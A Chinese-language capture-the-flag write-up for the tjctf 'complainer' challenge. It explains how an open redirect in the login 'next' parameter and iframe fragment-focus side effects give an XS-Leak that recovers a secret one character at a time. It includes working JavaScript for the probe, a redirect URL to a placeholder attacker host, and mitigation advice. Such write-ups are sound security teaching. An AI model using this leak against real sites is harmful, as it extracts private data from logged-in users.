# complainer

## 题目简述

管理员注册随机账号并把 flag 作为第一条 complaint 保存。`/profile` 的前端会把每个 complaint 字符生成一个锚点，其 ID 为：

```text
<post-index>-<char-index>-<char>
```

页面本身没有可用 XSS，但登录页接受 `next` 参数，已登录管理员访问 `/login?next=<攻击者站点>` 时会被前端重定向到攻击者页面。攻击者可用跨源 iframe 的片段聚焦行为构造 XS-Leak，逐字符判断这些 ID 是否存在。

## 解题过程

攻击页面先让一个输入框保持焦点，再加载 `https://TARGET/profile` 到 iframe。对于位置 $i$ 和候选字符 $c$，把 iframe 地址改为：

```text
https://TARGET/profile#0-i-c
```

如果该 ID 存在，浏览器会聚焦对应锚点，顶层页面当前输入失焦并触发 `window.onblur`；若不存在则不会触发。攻击代码据此枚举字符集并扩展已知前缀：

```javascript
let flag = 'tjctf{';
const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_{}';

async function testChar(char) {
    const frame = document.createElement('iframe');
    frame.src = 'https://TARGET/profile';
    document.body.appendChild(frame);
    await new Promise(resolve => setTimeout(resolve, 100));
    frame.src = `https://TARGET/profile#0-${flag.length}-${char}`;
    await new Promise(resolve => setTimeout(resolve, 1000));
    frame.remove();
}
```

`onblur` 记录当前候选并重新聚焦输入框。将同源登录跳转 URL提交给管理员：

```text
https://TARGET/login?next=https://ATTACKER/
```

逐位泄露得到：

```text
tjctf{grrrrrrrrr_315b9c0f}
```

## 方法总结

- 跨源策略会阻止读取 iframe DOM，但不会完全隐藏焦点、导航、尺寸和计时等浏览器副作用。
- 将秘密字符放进可预测 DOM ID，使片段导航是否命中变成字符 oracle；随机 post ID 并不能保护 profile 中生成的字符 ID。
- 修复应避免把秘密编码进可寻址 DOM 属性，限制外部 `next` 跳转，并通过合适的 frame/CSP 策略阻止跨源嵌入。
